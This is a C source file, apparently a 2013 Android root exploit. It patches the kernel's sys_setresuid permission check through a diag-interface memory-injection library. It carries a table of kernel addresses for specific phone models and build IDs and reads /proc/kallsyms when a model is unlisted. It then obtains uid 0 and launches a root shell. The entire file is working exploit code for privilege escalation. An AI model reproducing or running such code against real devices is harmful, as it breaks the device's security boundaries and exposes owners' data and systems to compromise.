/*
 * Copyright (C) 2013 Hiroyuki Ikezoe
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/system_properties.h>

#include "libdiagexploit/diag.h"

typedef struct _supported_device {
  const char *device;
  const char *build_id;
  unsigned long int set_sysresuid_check_address;
} supported_device;

static supported_device supported_devices[] = {
  { "F-03D",            "V24R33Cc"  , 0xc00e838c },
  { "F-11D",            "V21R36A"   , 0xc00fda10 },
  { "F-11D",            "V24R40A"   , 0xc00fda0c },
  { "F-11D",            "V26R42B"   , 0xc00fdac8 },
  { "F-12C",            "V21"       , 0xc00e5a90 },
  { "IS11N",            "GRJ90"     , 0xc00f0a04 },
  { "IS17SH",           "01.00.03"  , 0xc01b82a4 },
  { "ISW11K",           "145.0.0002", 0xc010ae18 },
  { "URBANO PROGRESSO", "010.0.3000", 0xc0176d40 },
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static unsigned long int
get_sys_setresuid_check_address_from_kallayms(void)
{
  FILE *fp;
  char function[BUFSIZ];
  char symbol;
  uint32_t address;
  int ret;

  fp = fopen("/proc/kallsyms", "r");
  if (!fp) {
    printf("Failed to open /proc/kallsyms due to %s.", strerror(errno));
    return 0;
  }

  while((ret = fscanf(fp, "%x %c %s", &address, &symbol, function)) != EOF) {
    if (!strcmp(function, "sys_setresuid")) {
      fclose(fp);
      return address;
    }
  }
  fclose(fp);

  return 0;
}

static unsigned long int
get_sys_setresuid_check_addresses(void)
{
  int i;
  char device[PROP_VALUE_MAX];
  char build_id[PROP_VALUE_MAX];

  __system_property_get("ro.product.model", device);
  __system_property_get("ro.build.display.id", build_id);

  for (i = 0; i < n_supported_devices; i++) {
    if (!strcmp(device, supported_devices[i].device) &&
        !strcmp(build_id, supported_devices[i].build_id)) {
      return supported_devices[i].set_sysresuid_check_address;
    }
  }

  printf("%s (%s) is not supported.\n", device, build_id);
  printf("Attempting to detect from /proc/kallsyms...\n");

  return get_sys_setresuid_check_address_from_kallayms();
}

static bool
inject_command(const char *command,
               unsigned long int sys_setresuid_check_address)
{
  struct diag_values injection_data;

  injection_data.address = sys_setresuid_check_address;
  injection_data.value = command[0] | (command[1] << 8);

  return diag_inject(&injection_data, 1);
}

static bool
break_sys_setresuid(unsigned long int sys_setresuid_check_address)
{
  const char beq[] = { 0x00, 0x0a };
  return inject_command(beq, sys_setresuid_check_address + 0x42);
}

static bool
restore_sys_setresuid(unsigned long int sys_setresuid_check_address)
{
  const char bne[] = { 0x00, 0x1a };
  return inject_command(bne, sys_setresuid_check_address + 0x42);
}

int
main(int argc, char **argv)
{
  int ret;
  unsigned long int sys_setresuid_check_address;

  sys_setresuid_check_address = get_sys_setresuid_check_addresses();
  if (!sys_setresuid_check_address) {
    exit(EXIT_FAILURE);
  }

  ret = break_sys_setresuid(sys_setresuid_check_address);
  if (ret < 0) {
    exit(EXIT_FAILURE);
  }

  ret = setresuid(0, 0, 0);
  restore_sys_setresuid(sys_setresuid_check_address);

  if (ret < 0) {
    printf("failed to get root access\n");
    exit(EXIT_FAILURE);
  }

  system("/system/bin/sh");

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
